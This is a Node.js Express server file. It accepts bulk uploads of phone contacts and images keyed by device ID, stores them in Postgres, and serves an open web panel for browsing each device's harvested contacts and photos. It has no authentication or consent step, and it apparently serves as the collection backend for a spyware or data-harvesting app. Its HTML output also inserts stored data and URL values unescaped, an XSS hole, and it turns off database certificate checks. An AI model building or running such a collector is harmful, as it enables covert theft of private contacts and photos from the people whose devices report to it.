const express = require("express");
const bodyParser = require("body-parser");
const { Pool } = require("pg");

const app = express();
app.use(bodyParser.json({ limit: "50mb" }));

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false }
});

// ================= DB SETUP =================
async function initDB() {
  await pool.query(`
    CREATE TABLE IF NOT EXISTS users (
      id SERIAL PRIMARY KEY,
      device_id TEXT UNIQUE,
      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    );

    CREATE TABLE IF NOT EXISTS contacts (
      id SERIAL PRIMARY KEY,
      device_id TEXT,
      contact_data TEXT,
      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    );

    CREATE TABLE IF NOT EXISTS images (
      id SERIAL PRIMARY KEY,
      device_id TEXT,
      image_data TEXT,
      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    );
  `);
}
initDB();

// ================= RECEIVE DATA (FAST BULK VERSION) =================
app.post("/receive", async (req, res) => {
  try {
    const { type, device_id, data } = req.body;

    // Register user
    await pool.query(
      "INSERT INTO users (device_id) VALUES ($1) ON CONFLICT DO NOTHING",
      [device_id]
    );

    // ================= CONTACTS =================
    if (type === "contacts" && Array.isArray(data)) {

      const values = [];
      const placeholders = [];

      data.forEach((contact, index) => {
        placeholders.push(`($1, $${index + 2})`);
        values.push(contact);
      });

      await pool.query(
        `INSERT INTO contacts (device_id, contact_data)
         VALUES ${placeholders.join(",")}`,
        [device_id, ...values]
      );
    }

    // ================= IMAGES =================
    if (type === "images" && Array.isArray(data)) {

      const values = [];
      const placeholders = [];

      data.forEach((img, index) => {
        placeholders.push(`($1, $${index + 2})`);
        values.push(img);
      });

      await pool.query(
        `INSERT INTO images (device_id, image_data)
         VALUES ${placeholders.join(",")}`,
        [device_id, ...values]
      );
    }

    res.send("Bulk Saved ✅");
  } catch (err) {
    console.error(err);
    res.status(500).send("Error");
  }
});

// ================= USERS LIST =================
app.get("/users", async (req, res) => {
  const result = await pool.query("SELECT * FROM users ORDER BY id DESC");

  let html = "<h1>Users</h1>";

  result.rows.forEach(user => {
    html += `
      <div style="margin:10px;">
        <a href="/user/${user.device_id}">
          ${user.device_id}
        </a>
      </div>
    `;
  });

  res.send(html);
});

// ================= USER DATA =================
app.get("/user/:device_id", async (req, res) => {
  const device_id = req.params.device_id;

  const contacts = await pool.query(
    "SELECT * FROM contacts WHERE device_id=$1",
    [device_id]
  );

  const images = await pool.query(
    "SELECT * FROM images WHERE device_id=$1",
    [device_id]
  );

  let html = `<h1>User: ${device_id}</h1>`;

  html += "<h2>Contacts</h2>";
  contacts.rows.forEach(c => {
    html += `<p>${c.contact_data}</p>`;
  });

  html += "<h2>Images</h2>";
  images.rows.forEach(img => {
    html += `
      <img src="data:image/jpeg;base64,${img.image_data}" width="200"/>
    `;
  });

  res.send(html);
});

// ================= HOME =================
app.get("/", (req, res) => {
  res.send(`
    <h1>Backend Running ✅</h1>
    <a href="/users">View Users</a>
  `);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("Server running"));
